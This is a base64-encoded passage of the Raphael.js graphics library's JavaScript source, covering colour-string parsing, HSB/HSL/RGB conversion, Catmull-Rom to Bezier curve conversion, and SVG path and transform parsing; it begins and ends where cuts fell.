bGk+cmdiKOKAouKAouKAoiwg4oCi4oCi4oCiLCDigKLigKLigKIpIOKAlCByZWQsIGdyZWVuIGFuZCBibHVlIGNoYW5uZWxz4oCZIHZhbHVlczogKOKAnDxjb2RlPnJnYigyMDAsJm5ic3A7MTAwLCZuYnNwOzApPC9jb2RlPuKAnSk8L2xpPlxuICAgICAjICAgICA8bGk+cmdiKOKAouKAouKAoiUsIOKAouKAouKAoiUsIOKAouKAouKAoiUpIOKAlCBzYW1lIGFzIGFib3ZlLCBidXQgaW4gJTogKOKAnDxjb2RlPnJnYigxMDAlLCZuYnNwOzE3NSUsJm5ic3A7MCUpPC9jb2RlPuKAnSk8L2xpPlxuICAgICAjICAgICA8bGk+aHNiKOKAouKAouKAoiwg4oCi4oCi4oCiLCDigKLigKLigKIpIOKAlCBodWUsIHNhdHVyYXRpb24gYW5kIGJyaWdodG5lc3MgdmFsdWVzOiAo4oCcPGNvZGU+aHNiKDAuNSwmbmJzcDswLjI1LCZuYnNwOzEpPC9jb2RlPuKAnSk8L2xpPlxuICAgICAjICAgICA8bGk+aHNiKOKAouKAouKAoiUsIOKAouKAouKAoiUsIOKAouKAouKAoiUpIOKAlCBzYW1lIGFzIGFib3ZlLCBidXQgaW4gJTwvbGk+XG4gICAgICMgICAgIDxsaT5oc2wo4oCi4oCi4oCiLCDigKLigKLigKIsIOKAouKAouKAoikg4oCUIHNhbWUgYXMgaHNiPC9saT5cbiAgICAgIyAgICAgPGxpPmhzbCjigKLigKLigKIlLCDigKLigKLigKIlLCDigKLigKLigKIlKSDigJQgc2FtZSBhcyBoc2I8L2xpPlxuICAgICAjIDwvdWw+XG4gICAgID0gKG9iamVjdCkgUkdCIG9iamVjdCBpbiBmb3JtYXQ6XG4gICAgIG8ge1xuICAgICBvICAgICByIChudW1iZXIpIHJlZCxcbiAgICAgbyAgICAgZyAobnVtYmVyKSBncmVlbixcbiAgICAgbyAgICAgYiAobnVtYmVyKSBibHVlXG4gICAgIG8gICAgIGhleCAoc3RyaW5nKSBjb2xvciBpbiBIVE1ML0NTUyBmb3JtYXQ6ICPigKLigKLigKLigKLigKLigKIsXG4gICAgIG8gICAgIGVycm9yIChib29sZWFuKSB0cnVlIGlmIHN0cmluZyBjYW7igJl0IGJlIHBhcnNlZFxuICAgICBvIH1cbiAgICBcXCovXG4gICAgUi5nZXRSR0IgPSBjYWNoZXIoZnVuY3Rpb24gKGNvbG91cikge1xuICAgICAgICBpZiAoIWNvbG91ciB8fCAhISgoY29sb3VyID0gU3RyKGNvbG91cikpLmluZGV4T2YoXCItXCIpICsgMSkpIHtcbiAgICAgICAgICAgIHJldHVybiB7cjogLTEsIGc6IC0xLCBiOiAtMSwgaGV4OiBcIm5vbmVcIiwgZXJyb3I6IDEsIHRvU3RyaW5nOiBjbHJUb1N0cmluZ307XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGNvbG91ciA9PSBcIm5vbmVcIikge1xuICAgICAgICAgICAgcmV0dXJuIHtyOiAtMSwgZzogLTEsIGI6IC0xLCBoZXg6IFwibm9uZVwiLCB0b1N0cmluZzogY2xyVG9TdHJpbmd9O1xuICAgICAgICB9XG4gICAgICAgICEoaHNyZ1toYXNdKGNvbG91ci50b0xvd2VyQ2FzZSgpLnN1YnN0cmluZygwLCAyKSkgfHwgY29sb3VyLmNoYXJBdCgpID09IFwiI1wiKSAmJiAoY29sb3VyID0gdG9IZXgoY29sb3VyKSk7XG4gICAgICAgIHZhciByZXMsXG4gICAgICAgICAgICByZWQsXG4gICAgICAgICAgICBncmVlbixcbiAgICAgICAgICAgIGJsdWUsXG4gICAgICAgICAgICBvcGFjaXR5LFxuICAgICAgICAgICAgdCxcbiAgICAgICAgICAgIHZhbHVlcyxcbiAgICAgICAgICAgIHJnYiA9IGNvbG91ci5tYXRjaChjb2xvdXJSZWdFeHApO1xuICAgICAgICBpZiAocmdiKSB7XG4gICAgICAgICAgICBpZiAocmdiWzJdKSB7XG4gICAgICAgICAgICAgICAgYmx1ZSA9IHRvSW50KHJnYlsyXS5zdWJzdHJpbmcoNSksIDE2KTtcbiAgICAgICAgICAgICAgICBncmVlbiA9IHRvSW50KHJnYlsyXS5zdWJzdHJpbmcoMywgNSksIDE2KTtcbiAgICAgICAgICAgICAgICByZWQgPSB0b0ludChyZ2JbMl0uc3Vic3RyaW5nKDEsIDMpLCAxNik7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAocmdiWzNdKSB7XG4gICAgICAgICAgICAgICAgYmx1ZSA9IHRvSW50KCh0ID0gcmdiWzNdLmNoYXJBdCgzKSkgKyB0LCAxNik7XG4gICAgICAgICAgICAgICAgZ3JlZW4gPSB0b0ludCgodCA9IHJnYlszXS5jaGFyQXQoMikpICsgdCwgMTYpO1xuICAgICAgICAgICAgICAgIHJlZCA9IHRvSW50KCh0ID0gcmdiWzNdLmNoYXJBdCgxKSkgKyB0LCAxNik7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAocmdiWzRdKSB7XG4gICAgICAgICAgICAgICAgdmFsdWVzID0gcmdiWzRdW3NwbGl0XShjb21tYVNwYWNlcyk7XG4gICAgICAgICAgICAgICAgcmVkID0gdG9GbG9hdCh2YWx1ZXNbMF0pO1xuICAgICAgICAgICAgICAgIHZhbHVlc1swXS5zbGljZSgtMSkgPT0gXCIlXCIgJiYgKHJlZCAqPSAyLjU1KTtcbiAgICAgICAgICAgICAgICBncmVlbiA9IHRvRmxvYXQodmFsdWVzWzFdKTtcbiAgICAgICAgICAgICAgICB2YWx1ZXNbMV0uc2xpY2UoLTEpID09IFwiJVwiICYmIChncmVlbiAqPSAyLjU1KTtcbiAgICAgICAgICAgICAgICBibHVlID0gdG9GbG9hdCh2YWx1ZXNbMl0pO1xuICAgICAgICAgICAgICAgIHZhbHVlc1syXS5zbGljZSgtMSkgPT0gXCIlXCIgJiYgKGJsdWUgKj0gMi41NSk7XG4gICAgICAgICAgICAgICAgcmdiWzFdLnRvTG93ZXJDYXNlKCkuc2xpY2UoMCwgNCkgPT0gXCJyZ2JhXCIgJiYgKG9wYWNpdHkgPSB0b0Zsb2F0KHZhbHVlc1szXSkpO1xuICAgICAgICAgICAgICAgIHZhbHVlc1szXSAmJiB2YWx1ZXNbM10uc2xpY2UoLTEpID09IFwiJVwiICYmIChvcGFjaXR5IC89IDEwMCk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAocmdiWzVdKSB7XG4gICAgICAgICAgICAgICAgdmFsdWVzID0gcmdiWzVdW3NwbGl0XShjb21tYVNwYWNlcyk7XG4gICAgICAgICAgICAgICAgcmVkID0gdG9GbG9hdCh2YWx1ZXNbMF0pO1xuICAgICAgICAgICAgICAgIHZhbHVlc1swXS5zbGljZSgtMSkgPT0gXCIlXCIgJiYgKHJlZCAqPSAyLjU1KTtcbiAgICAgICAgICAgICAgICBncmVlbiA9IHRvRmxvYXQodmFsdWVzWzFdKTtcbiAgICAgICAgICAgICAgICB2YWx1ZXNbMV0uc2xpY2UoLTEpID09IFwiJVwiICYmIChncmVlbiAqPSAyLjU1KTtcbiAgICAgICAgICAgICAgICBibHVlID0gdG9GbG9hdCh2YWx1ZXNbMl0pO1xuICAgICAgICAgICAgICAgIHZhbHVlc1syXS5zbGljZSgtMSkgPT0gXCIlXCIgJiYgKGJsdWUgKj0gMi41NSk7XG4gICAgICAgICAgICAgICAgKHZhbHVlc1swXS5zbGljZSgtMykgPT0gXCJkZWdcIiB8fCB2YWx1ZXNbMF0uc2xpY2UoLTEpID09IFwiXFx4YjBcIikgJiYgKHJlZCAvPSAzNjApO1xuICAgICAgICAgICAgICAgIHJnYlsxXS50b0xvd2VyQ2FzZSgpLnNsaWNlKDAsIDQpID09IFwiaHNiYVwiICYmIChvcGFjaXR5ID0gdG9GbG9hdCh2YWx1ZXNbM10pKTtcbiAgICAgICAgICAgICAgICB2YWx1ZXNbM10gJiYgdmFsdWVzWzNdLnNsaWNlKC0xKSA9PSBcIiVcIiAmJiAob3BhY2l0eSAvPSAxMDApO1xuICAgICAgICAgICAgICAgIHJldHVybiBSLmhzYjJyZ2IocmVkLCBncmVlbiwgYmx1ZSwgb3BhY2l0eSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAocmdiWzZdKSB7XG4gICAgICAgICAgICAgICAgdmFsdWVzID0gcmdiWzZdW3NwbGl0XShjb21tYVNwYWNlcyk7XG4gICAgICAgICAgICAgICAgcmVkID0gdG9GbG9hdCh2YWx1ZXNbMF0pO1xuICAgICAgICAgICAgICAgIHZhbHVlc1swXS5zbGljZSgtMSkgPT0gXCIlXCIgJiYgKHJlZCAqPSAyLjU1KTtcbiAgICAgICAgICAgICAgICBncmVlbiA9IHRvRmxvYXQodmFsdWVzWzFdKTtcbiAgICAgICAgICAgICAgICB2YWx1ZXNbMV0uc2xpY2UoLTEpID09IFwiJVwiICYmIChncmVlbiAqPSAyLjU1KTtcbiAgICAgICAgICAgICAgICBibHVlID0gdG9GbG9hdCh2YWx1ZXNbMl0pO1xuICAgICAgICAgICAgICAgIHZhbHVlc1syXS5zbGljZSgtMSkgPT0gXCIlXCIgJiYgKGJsdWUgKj0gMi41NSk7XG4gICAgICAgICAgICAgICAgKHZhbHVlc1swXS5zbGljZSgtMykgPT0gXCJkZWdcIiB8fCB2YWx1ZXNbMF0uc2xpY2UoLTEpID09IFwiXFx4YjBcIikgJiYgKHJlZCAvPSAzNjApO1xuICAgICAgICAgICAgICAgIHJnYlsxXS50b0xvd2VyQ2FzZSgpLnNsaWNlKDAsIDQpID09IFwiaHNsYVwiICYmIChvcGFjaXR5ID0gdG9GbG9hdCh2YWx1ZXNbM10pKTtcbiAgICAgICAgICAgICAgICB2YWx1ZXNbM10gJiYgdmFsdWVzWzNdLnNsaWNlKC0xKSA9PSBcIiVcIiAmJiAob3BhY2l0eSAvPSAxMDApO1xuICAgICAgICAgICAgICAgIHJldHVybiBSLmhzbDJyZ2IocmVkLCBncmVlbiwgYmx1ZSwgb3BhY2l0eSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZ2IgPSB7cjogcmVkLCBnOiBncmVlbiwgYjogYmx1ZSwgdG9TdHJpbmc6IGNsclRvU3RyaW5nfTtcbiAgICAgICAgICAgIHJnYi5oZXggPSBcIiNcIiArICgxNjc3NzIxNiB8IGJsdWUgfCAoZ3JlZW4gPDwgOCkgfCAocmVkIDw8IDE2KSkudG9TdHJpbmcoMTYpLnNsaWNlKDEpO1xuICAgICAgICAgICAgUi5pcyhvcGFjaXR5LCBcImZpbml0ZVwiKSAmJiAocmdiLm9wYWNpdHkgPSBvcGFjaXR5KTtcbiAgICAgICAgICAgIHJldHVybiByZ2I7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHtyOiAtMSwgZzogLTEsIGI6IC0xLCBoZXg6IFwibm9uZVwiLCBlcnJvcjogMSwgdG9TdHJpbmc6IGNsclRvU3RyaW5nfTtcbiAgICB9LCBSKTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5oc2JcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIENvbnZlcnRzIEhTQiB2YWx1ZXMgdG8gaGV4IHJlcHJlc2VudGF0aW9uIG9mIHRoZSBjb2xvdXIuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGggKG51bWJlcikgaHVlXG4gICAgIC0gcyAobnVtYmVyKSBzYXR1cmF0aW9uXG4gICAgIC0gYiAobnVtYmVyKSB2YWx1ZSBvciBicmlnaHRuZXNzXG4gICAgID0gKHN0cmluZykgaGV4IHJlcHJlc2VudGF0aW9uIG9mIHRoZSBjb2xvdXIuXG4gICAgXFwqL1xuICAgIFIuaHNiID0gY2FjaGVyKGZ1bmN0aW9uIChoLCBzLCBiKSB7XG4gICAgICAgIHJldHVybiBSLmhzYjJyZ2IoaCwgcywgYikuaGV4O1xuICAgIH0pO1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLmhzbFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQ29udmVydHMgSFNMIHZhbHVlcyB0byBoZXggcmVwcmVzZW50YXRpb24gb2YgdGhlIGNvbG91ci5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gaCAobnVtYmVyKSBodWVcbiAgICAgLSBzIChudW1iZXIpIHNhdHVyYXRpb25cbiAgICAgLSBsIChudW1iZXIpIGx1bWlub3NpdHlcbiAgICAgPSAoc3RyaW5nKSBoZXggcmVwcmVzZW50YXRpb24gb2YgdGhlIGNvbG91ci5cbiAgICBcXCovXG4gICAgUi5oc2wgPSBjYWNoZXIoZnVuY3Rpb24gKGgsIHMsIGwpIHtcbiAgICAgICAgcmV0dXJuIFIuaHNsMnJnYihoLCBzLCBsKS5oZXg7XG4gICAgfSk7XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwucmdiXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBDb252ZXJ0cyBSR0IgdmFsdWVzIHRvIGhleCByZXByZXNlbnRhdGlvbiBvZiB0aGUgY29sb3VyLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSByIChudW1iZXIpIHJlZFxuICAgICAtIGcgKG51bWJlcikgZ3JlZW5cbiAgICAgLSBiIChudW1iZXIpIGJsdWVcbiAgICAgPSAoc3RyaW5nKSBoZXggcmVwcmVzZW50YXRpb24gb2YgdGhlIGNvbG91ci5cbiAgICBcXCovXG4gICAgUi5yZ2IgPSBjYWNoZXIoZnVuY3Rpb24gKHIsIGcsIGIpIHtcbiAgICAgICAgZnVuY3Rpb24gcm91bmQoeCkgeyByZXR1cm4gKHggKyAwLjUpIHwgMDsgfVxuICAgICAgICByZXR1cm4gXCIjXCIgKyAoMTY3NzcyMTYgfCByb3VuZChiKSB8IChyb3VuZChnKSA8PCA4KSB8IChyb3VuZChyKSA8PCAxNikpLnRvU3RyaW5nKDE2KS5zbGljZSgxKTtcbiAgICB9KTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5nZXRDb2xvclxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogT24gZWFjaCBjYWxsIHJldHVybnMgbmV4dCBjb2xvdXIgaW4gdGhlIHNwZWN0cnVtLiBUbyByZXNldCBpdCBiYWNrIHRvIHJlZCBjYWxsIEBSYXBoYWVsLmdldENvbG9yLnJlc2V0XG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHZhbHVlIChudW1iZXIpICNvcHRpb25hbCBicmlnaHRuZXNzLCBkZWZhdWx0IGlzIGAwLjc1YFxuICAgICA9IChzdHJpbmcpIGhleCByZXByZXNlbnRhdGlvbiBvZiB0aGUgY29sb3VyLlxuICAgIFxcKi9cbiAgICBSLmdldENvbG9yID0gZnVuY3Rpb24gKHZhbHVlKSB7XG4gICAgICAgIHZhciBzdGFydCA9IHRoaXMuZ2V0Q29sb3Iuc3RhcnQgPSB0aGlzLmdldENvbG9yLnN0YXJ0IHx8IHtoOiAwLCBzOiAxLCBiOiB2YWx1ZSB8fCAuNzV9LFxuICAgICAgICAgICAgcmdiID0gdGhpcy5oc2IycmdiKHN0YXJ0LmgsIHN0YXJ0LnMsIHN0YXJ0LmIpO1xuICAgICAgICBzdGFydC5oICs9IC4wNzU7XG4gICAgICAgIGlmIChzdGFydC5oID4gMSkge1xuICAgICAgICAgICAgc3RhcnQuaCA9IDA7XG4gICAgICAgICAgICBzdGFydC5zIC09IC4yO1xuICAgICAgICAgICAgc3RhcnQucyA8PSAwICYmICh0aGlzLmdldENvbG9yLnN0YXJ0ID0ge2g6IDAsIHM6IDEsIGI6IHN0YXJ0LmJ9KTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gcmdiLmhleDtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLmdldENvbG9yLnJlc2V0XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXNldHMgc3BlY3RydW0gcG9zaXRpb24gZm9yIEBSYXBoYWVsLmdldENvbG9yIGJhY2sgdG8gcmVkLlxuICAgIFxcKi9cbiAgICBSLmdldENvbG9yLnJlc2V0ID0gZnVuY3Rpb24gKCkge1xuICAgICAgICBkZWxldGUgdGhpcy5zdGFydDtcbiAgICB9O1xuXG4gICAgLy8gaHR0cDovL3NjaGVwZXJzLmNjL2dldHRpbmctdG8tdGhlLXBvaW50XG4gICAgZnVuY3Rpb24gY2F0bXVsbFJvbTJiZXppZXIoY3JwLCB6KSB7XG4gICAgICAgIHZhciBkID0gW107XG4gICAgICAgIGZvciAodmFyIGkgPSAwLCBpTGVuID0gY3JwLmxlbmd0aDsgaUxlbiAtIDIgKiAheiA+IGk7IGkgKz0gMikge1xuICAgICAgICAgICAgdmFyIHAgPSBbXG4gICAgICAgICAgICAgICAgICAgICAgICB7eDogK2NycFtpIC0gMl0sIHk6ICtjcnBbaSAtIDFdfSxcbiAgICAgICAgICAgICAgICAgICAgICAgIHt4OiArY3JwW2ldLCAgICAgeTogK2NycFtpICsgMV19LFxuICAgICAgICAgICAgICAgICAgICAgICAge3g6ICtjcnBbaSArIDJdLCB5OiArY3JwW2kgKyAzXX0sXG4gICAgICAgICAgICAgICAgICAgICAgICB7eDogK2NycFtpICsgNF0sIHk6ICtjcnBbaSArIDVdfVxuICAgICAgICAgICAgICAgICAgICBdO1xuICAgICAgICAgICAgaWYgKHopIHtcbiAgICAgICAgICAgICAgICBpZiAoIWkpIHtcbiAgICAgICAgICAgICAgICAgICAgcFswXSA9IHt4OiArY3JwW2lMZW4gLSAyXSwgeTogK2NycFtpTGVuIC0gMV19O1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoaUxlbiAtIDQgPT0gaSkge1xuICAgICAgICAgICAgICAgICAgICBwWzNdID0ge3g6ICtjcnBbMF0sIHk6ICtjcnBbMV19O1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoaUxlbiAtIDIgPT0gaSkge1xuICAgICAgICAgICAgICAgICAgICBwWzJdID0ge3g6ICtjcnBbMF0sIHk6ICtjcnBbMV19O1xuICAgICAgICAgICAgICAgICAgICBwWzNdID0ge3g6ICtjcnBbMl0sIHk6ICtjcnBbM119O1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgaWYgKGlMZW4gLSA0ID09IGkpIHtcbiAgICAgICAgICAgICAgICAgICAgcFszXSA9IHBbMl07XG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICghaSkge1xuICAgICAgICAgICAgICAgICAgICBwWzBdID0ge3g6ICtjcnBbaV0sIHk6ICtjcnBbaSArIDFdfTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBkLnB1c2goW1wiQ1wiLFxuICAgICAgICAgICAgICAgICAgKC1wWzBdLnggKyA2ICogcFsxXS54ICsgcFsyXS54KSAvIDYsXG4gICAgICAgICAgICAgICAgICAoLXBbMF0ueSArIDYgKiBwWzFdLnkgKyBwWzJdLnkpIC8gNixcbiAgICAgICAgICAgICAgICAgIChwWzFdLnggKyA2ICogcFsyXS54IC0gcFszXS54KSAvIDYsXG4gICAgICAgICAgICAgICAgICAocFsxXS55ICsgNipwWzJdLnkgLSBwWzNdLnkpIC8gNixcbiAgICAgICAgICAgICAgICAgIHBbMl0ueCxcbiAgICAgICAgICAgICAgICAgIHBbMl0ueVxuICAgICAgICAgICAgXSk7XG4gICAgICAgIH1cblxuICAgICAgICByZXR1cm4gZDtcbiAgICB9XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwucGFyc2VQYXRoU3RyaW5nXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBVdGlsaXR5IG1ldGhvZFxuICAgICAqKlxuICAgICAqIFBhcnNlcyBnaXZlbiBwYXRoIHN0cmluZyBpbnRvIGFuIGFycmF5IG9mIGFycmF5cyBvZiBwYXRoIHNlZ21lbnRzLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBwYXRoU3RyaW5nIChzdHJpbmd8YXJyYXkpIHBhdGggc3RyaW5nIG9yIGFycmF5IG9mIHNlZ21lbnRzIChpbiB0aGUgbGFzdCBjYXNlIGl0IHdpbGwgYmUgcmV0dXJuZWQgc3RyYWlnaHQgYXdheSlcbiAgICAgPSAoYXJyYXkpIGFycmF5IG9mIHNlZ21lbnRzLlxuICAgIFxcKi9cbiAgICBSLnBhcnNlUGF0aFN0cmluZyA9IGZ1bmN0aW9uIChwYXRoU3RyaW5nKSB7XG4gICAgICAgIGlmICghcGF0aFN0cmluZykge1xuICAgICAgICAgICAgcmV0dXJuIG51bGw7XG4gICAgICAgIH1cbiAgICAgICAgdmFyIHB0aCA9IHBhdGhzKHBhdGhTdHJpbmcpO1xuICAgICAgICBpZiAocHRoLmFycikge1xuICAgICAgICAgICAgcmV0dXJuIHBhdGhDbG9uZShwdGguYXJyKTtcbiAgICAgICAgfVxuXG4gICAgICAgIHZhciBwYXJhbUNvdW50cyA9IHthOiA3LCBjOiA2LCBoOiAxLCBsOiAyLCBtOiAyLCByOiA0LCBxOiA0LCBzOiA0LCB0OiAyLCB2OiAxLCB6OiAwfSxcbiAgICAgICAgICAgIGRhdGEgPSBbXTtcbiAgICAgICAgaWYgKFIuaXMocGF0aFN0cmluZywgYXJyYXkpICYmIFIuaXMocGF0aFN0cmluZ1swXSwgYXJyYXkpKSB7IC8vIHJvdWdoIGFzc3VtcHRpb25cbiAgICAgICAgICAgIGRhdGEgPSBwYXRoQ2xvbmUocGF0aFN0cmluZyk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFkYXRhLmxlbmd0aCkge1xuICAgICAgICAgICAgU3RyKHBhdGhTdHJpbmcpLnJlcGxhY2UocGF0aENvbW1hbmQsIGZ1bmN0aW9uIChhLCBiLCBjKSB7XG4gICAgICAgICAgICAgICAgdmFyIHBhcmFtcyA9IFtdLFxuICAgICAgICAgICAgICAgICAgICBuYW1lID0gYi50b0xvd2VyQ2FzZSgpO1xuICAgICAgICAgICAgICAgIGMucmVwbGFjZShwYXRoVmFsdWVzLCBmdW5jdGlvbiAoYSwgYikge1xuICAgICAgICAgICAgICAgICAgICBiICYmIHBhcmFtcy5wdXNoKCtiKTtcbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICBpZiAobmFtZSA9PSBcIm1cIiAmJiBwYXJhbXMubGVuZ3RoID4gMikge1xuICAgICAgICAgICAgICAgICAgICBkYXRhLnB1c2goW2JdW2NvbmNhdF0ocGFyYW1zLnNwbGljZSgwLCAyKSkpO1xuICAgICAgICAgICAgICAgICAgICBuYW1lID0gXCJsXCI7XG4gICAgICAgICAgICAgICAgICAgIGIgPSBiID09IFwibVwiID8gXCJsXCIgOiBcIkxcIjtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgaWYgKG5hbWUgPT0gXCJyXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgZGF0YS5wdXNoKFtiXVtjb25jYXRdKHBhcmFtcykpO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB3aGlsZSAocGFyYW1zLmxlbmd0aCA+PSBwYXJhbUNvdW50c1tuYW1lXSkge1xuICAgICAgICAgICAgICAgICAgICBkYXRhLnB1c2goW2JdW2NvbmNhdF0ocGFyYW1zLnNwbGljZSgwLCBwYXJhbUNvdW50c1tuYW1lXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFwYXJhbUNvdW50c1tuYW1lXSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgICAgICBkYXRhLnRvU3RyaW5nID0gUi5fcGF0aDJzdHJpbmc7XG4gICAgICAgIHB0aC5hcnIgPSBwYXRoQ2xvbmUoZGF0YSk7XG4gICAgICAgIHJldHVybiBkYXRhO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwucGFyc2VUcmFuc2Zvcm1TdHJpbmdcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFV0aWxpdHkgbWV0aG9kXG4gICAgICoqXG4gICAgICogUGFyc2VzIGdpdmVuIHBhdGggc3RyaW5nIGludG8gYW4gYXJyYXkgb2YgdHJhbnNmb3JtYXRpb25zLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBUU3RyaW5nIChzdHJpbmd8YXJyYXkpIHRyYW5zZm9ybSBzdHJpbmcgb3IgYXJyYXkgb2YgdHJhbnNmb3JtYXRpb25zIChpbiB0aGUgbGFzdCBjYXNlIGl0IHdpbGwgYmUgcmV0dXJuZWQgc3RyYWlnaHQgYXdheSlcbiAgICAgPSAoYXJyYXkpIGFycmF5IG9mIHRyYW5zZm9ybWF0aW9ucy5cbiAgICBcXCovXG4gICAgUi5wYXJzZVRyYW5zZm9ybVN0cmluZyA9IGNhY2hlcihmdW5jdGlvbiAoVFN0cmluZykge1xuICAgICAgICBpZiAoIVRTdHJpbmcpIHtcbiAgICAgICAgICAgIHJldHVybiBudWxsO1xuICAgICAgICB9XG4gICAgICAgIHZhciBwYXJhbUNvdW50cyA9IHtyOiAzLCBzOiA0LCB0OiAyLCBtOiA2fSxcbiAgICAgICAgICAgIGRhdGEgPSBbXTtcbiAgICAgICAgaWYgKFIuaXMoVFN0cmluZywgYXJyYXkpICYmIFIuaXMoVFN0cmluZ1swXSwgYXJyYXkpKSB7IC8vIHJvdWdoIGFzc3VtcHRpb25cbiAgICAgICAgICAgIGRhdGEgPSBwYXRoQ2xvbmUoVFN0cmluZyk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFkYXRhLmxlbmd0aCkge1xuICAgICAgICAgICAgU3RyKFRTdHJpbmcpLnJlcGxhY2UodENvbW1hbmQsIGZ1bmN0aW9uIChhLCBiLCBjKSB7XG4gICAgICAgICAgICAgICAgdmFyIHBhcmFtcyA9IFtdLFxuICAgICAgICAgICAgICAgICAgICBuYW1lID0gbG93ZXJDYXNlLmNhbGwoYik7XG4gICAgICAgICAgICAgICAgYy5yZXBsYWNlKHBhdGhWYWx1ZXMsIGZ1bmN0aW9uIChhLCBiKSB7XG4gICAgICAgICAgICAgICAgICAgIGIgJiYgcGFyYW1zLnB1c2goK2IpO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIGRhdGEucHVzaChbYl1bY29uY2F0XShwYXJhbXMpKTtcbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgICAgIGRhdGEudG9TdHJpbmcgPSBSLl9wYXRoMnN0cmluZztcbiAgICAgICAgcmV0dXJuIGRhdGE7XG4gICAgfSwgdGhpcywgZnVuY3Rpb24oZWxlbSkge1xuICAgICAgICBpZiAoIWVsZW0pIHJldHVybiBlbGVtO1xuICAgICAgICB2YXIgbmV3RGF0YSA9IFtdO1xuICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGVsZW0ubGVuZ3RoOyBpKyspIHtcbiAgICAgICAgICAgIHZhciBuZXdMZXZlbCA9IFtdO1xuICAgICAgICAgICAgZm9yICh2YXIgaiA9IDA7IGogPCBlbGVtW2ldLmxlbmd0aDsgaisrKSB7XG4gICAgICAgICAgICAgICAgbmV3TGV2ZWwucHVzaChlbGVtW2ldW2pdKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIG5ld0RhdGEucHVzaChuZXdMZXZlbCk7XG4gICAgICAgIH1cbiAgICAgIHJldHVybiBuZXdEYXRhOyB9ICk7XG4gICAgLy8gUEFUSFNcbiAgICB2YXIgcGF0aHMgPSBmdW5jdGlvbiAocHMpIHtcbiAgICAgICAgdmFyIHAgPSBwYXRocy5wcyA9IHBhdGhzLnBzIHx8IHt9O1xuICAgICAgICBpZiAocFtwc10pIHtcbiAgICAgICAgICAgIHBbcHNdLnNsZWVwID0gMTAwO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcFtwc10gPSB7XG4gICAgICAgICAgICAgICAgc2xlZXA6IDEwMFxuICAgICAgICAgICAgfTtcbiAgICAgICAgfVxuICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIGZvciAodmFyIGtleSBpbiBwKSBpZiAocFtoYXNdKGtleSkgJiYga2V5ICE9IHBzKSB7XG4gICAgICAgICAgICAgICAgcFtrZXldLnNsZWVwLS07XG4gICAgICAgICAgICAgICAgIXBba2V5XS5zbGVlcCAmJiBkZWxldGUgcFtrZXldO1xuICAgICAgICAgICAgfVxuICAgICAgICB9KTtcbiAgICAgICAgcmV0dXJuIHBbcHNdO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuZmluZERvdHNBdFNlZ21lbnRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFV0aWxpdHkgbWV0aG9kXG4gICAgICoqXG4gICAgICogRmluZCBkb3QgY29vcmRpbmF0ZXMgb24gdGhlIGdpdmVuIGN1YmljIGJlemllciBjdXJ2ZSBhdCB0aGUgZ2l2ZW4gdC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gcDF4IChudW1iZXIpIHggb2YgdGhlIGZpcnN0IHBvaW50IG9mIHRoZSBjdXJ2ZVxuICAgICAtIHAxeSAobnVtYmVyKSB5IG9mIHRoZSBmaXJzdCBwb2ludCBvZiB0aGUgY3VydmVcbiAgICAgLSBjMXggKG51bWJlcikgeCBvZiB0aGUgZmlyc3QgYW